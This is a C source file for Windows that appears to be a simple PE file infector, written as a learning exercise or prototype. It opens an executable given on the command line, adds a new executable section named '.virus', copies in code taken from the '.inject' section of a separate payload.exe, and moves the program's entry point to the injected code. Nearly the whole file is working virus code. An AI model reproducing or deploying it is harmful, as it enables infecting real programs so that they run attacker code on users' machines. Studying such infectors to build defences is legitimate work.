#include <stdio.h>
#include <string.h>
#include <assert.h>
#include <Windows.h>

typedef struct _payload_info_t
{
    BYTE *payload;
    int size;
}payload_info_t;


#define EXE_FILE_NAME (argv[1])
#define V_SECT_NAME ".virus"

#define BUFFER_SIZE 1024

typedef WINBOOL (*io_func)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
void io(io_func operation, BYTE *buffer, int size/*by Byte*/, HANDLE file, int offset_start/*FILE_BEGIN*/, LONG offset);

payload_info_t get_payload();



int main(int argc, char* argv[]) 
{   
    FILE *output = fopen("output.txt", "w");
    freopen("output.txt", "w", stdout);

    payload_info_t payload_info = get_payload();
    // payload_info_t payload_info = {payload, 1024};
    // exit(0);

    HANDLE file = CreateFile(EXE_FILE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (file == INVALID_HANDLE_VALUE) 
    {
        puts("Failed to open.");
        exit(1);
    }

// get nt_header to write back
    IMAGE_DOS_HEADER i_dos_header = {0};
    io(ReadFile, (BYTE*)&i_dos_header, sizeof(i_dos_header), file, FILE_BEGIN, 0);
    IMAGE_NT_HEADERS i_nt_headers = {0};
    io(ReadFile, (BYTE*)&i_nt_headers, sizeof(i_nt_headers), file, FILE_BEGIN, i_dos_header.e_lfanew);

    // printf("NumberOfSections: %d\n", i_nt_headers.FileHeader.NumberOfSections);
    // puts("Iterating through section headers...");

// get raw data size, NumberOfSections and the last header
    IMAGE_SECTION_HEADER i_sect_header = {0};
    int raw_data_size = 0;
    for (int i = 0; i < i_nt_headers.FileHeader.NumberOfSections; i++)
    {
        io(ReadFile, (BYTE*)&i_sect_header, sizeof(i_sect_header), file, FILE_CURRENT, 0);
        // puts(i_sect_header.Name);
        // printf("VirtualAddress: %X\n", i_sect_header.VirtualAddress);
        raw_data_size += i_sect_header.SizeOfRawData;
        // puts("");
    }
    puts("");
    
// Preparing for adding new section header
    // the end of IMAGE_SECTION_HEADERs (from FILE_BEGIN)
    int position = i_dos_header.e_lfanew 
        + sizeof(IMAGE_NT_HEADERS) 
        + i_nt_headers.FileHeader.NumberOfSections
        *sizeof(IMAGE_SECTION_HEADER); 
    // spare space of IMAGE_SECTION_HEADER
    int space = i_nt_headers.OptionalHeader.FileAlignment 
        - position % i_nt_headers.OptionalHeader.FileAlignment;
    int infect = (strcmp(V_SECT_NAME, i_sect_header.Name) != 0) 
        && (space >= sizeof(IMAGE_SECTION_HEADER)); 
    assert(infect);

// ADDING new section header: 
    int sect_start = position + space;  // start of original (host) codes
    int sect_end = sect_start + raw_data_size;  // end of original (host) codes

    DWORD payload_raw_size = ((payload_info.size / i_nt_headers.OptionalHeader.FileAlignment)
        + !!(payload_info.size % i_nt_headers.OptionalHeader.FileAlignment))
        *i_nt_headers.OptionalHeader.FileAlignment;
    DWORD PointerToRawData = sect_end;

// test
    // printf("sizeof(payload): %X\n",  sizeof(payload));
    // printf("payload_raw_size: %X\n", payload_raw_size);
    printf("FileAlignment: %X\n", i_nt_headers.OptionalHeader.FileAlignment);


    // i_sect_header is now the header of last section
    DWORD virus_v_addr = i_sect_header.VirtualAddress
        + i_sect_header.Misc.VirtualSize 
        + i_nt_headers.OptionalHeader.SectionAlignment 
        - i_sect_header.Misc.VirtualSize % i_nt_headers.OptionalHeader.SectionAlignment;

    DWORD Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;

    IMAGE_SECTION_HEADER new_sect_header = {
        V_SECT_NAME, 
        payload_info.size, 
        virus_v_addr, 
        payload_raw_size, // t
        PointerToRawData, // t
        0, 0, 0, 0, 
        Characteristics // t
    };

    io(WriteFile, (BYTE*)&new_sect_header, sizeof(new_sect_header), file, FILE_CURRENT, 0);
// END adding new section header()



// Updating nt_headers
    DWORD OriginalEntryPoint = i_nt_headers.OptionalHeader.AddressOfEntryPoint;
    printf("OriginalEntryPoint: %X\n", OriginalEntryPoint);
    printf("virus_v_addr: %X\n", virus_v_addr);

    i_nt_headers.OptionalHeader.AddressOfEntryPoint = virus_v_addr;
    i_nt_headers.FileHeader.NumberOfSections++;
    i_nt_headers.OptionalHeader.SizeOfHeaders += sizeof(IMAGE_SECTION_HEADER);
    // i_nt_headers.OptionalHeader.SizeOfCode += sizeof(IMAGE_SECTION_HEADER);
    i_nt_headers.OptionalHeader.SizeOfImage += payload_info.size
        + i_nt_headers.OptionalHeader.SectionAlignment 
        - payload_info.size % i_nt_headers.OptionalHeader.SectionAlignment;

    io(WriteFile, (BYTE*)&i_nt_headers, sizeof(i_nt_headers), file, FILE_BEGIN, i_dos_header.e_lfanew);
// END updating 



// print test for add new sect header 
    puts("After adding new sect header: ");
    SetFilePointer(file, i_dos_header.e_lfanew + sizeof(i_nt_headers), NULL, FILE_BEGIN);
    for (int i = 0; i < i_nt_headers.FileHeader.NumberOfSections; i++)
    {
        io(ReadFile, (BYTE*)&i_sect_header, sizeof(i_sect_header), file, FILE_CURRENT, 0);
        puts(i_sect_header.Name);
    }

    io(WriteFile, payload_info.payload, payload_info.size, file, FILE_BEGIN, sect_end);
}

void io(io_func operation, BYTE *buffer, int size/*by Byte*/, HANDLE file, int offset_start/*FILE_BEGIN*/, LONG offset)
{
    DWORD bytesRead = 0;

    if (SetFilePointer(file, offset, NULL, offset_start) == INVALID_SET_FILE_POINTER)
    {
        puts("Err when set pointer");
        exit(1);
    }
    if (!operation(file, buffer, size, &bytesRead, NULL)) 
    {
        puts("Failed to read.");
        CloseHandle(file);
        exit(1);
    }
}

#define PAYLOAD_FILE_NAME "payload.exe"
#define PAYLOAD_SECT_NAME ".inject"

payload_info_t get_payload()
{
    FILE* payload_file = fopen(PAYLOAD_FILE_NAME, "rb");

    IMAGE_DOS_HEADER i_dos_header = {0};
    fread(&i_dos_header, 1, sizeof(i_dos_header), payload_file);
    fseek(payload_file, i_dos_header.e_lfanew, SEEK_SET);
    IMAGE_NT_HEADERS i_nt_headers = {0};
    fread(&i_nt_headers, 1, sizeof(i_nt_headers), payload_file);

    IMAGE_SECTION_HEADER i_sect_header = {0};
    for (int i = 0; i < i_nt_headers.FileHeader.NumberOfSections; i++)
    {
        fread(&i_sect_header, 1, sizeof(i_sect_header), payload_file);
        if(strcmp(i_sect_header.Name, PAYLOAD_SECT_NAME) == 0)
        {
            break;
        }
    }
    fseek(payload_file, i_sect_header.PointerToRawData, SEEK_SET);
    BYTE *payload = (BYTE*)malloc(i_sect_header.Misc.VirtualSize);
    fread(payload, 1, i_sect_header.Misc.VirtualSize, payload_file);
    payload_info_t payload_info = {payload, i_sect_header.Misc.VirtualSize};
    return payload_info;
}
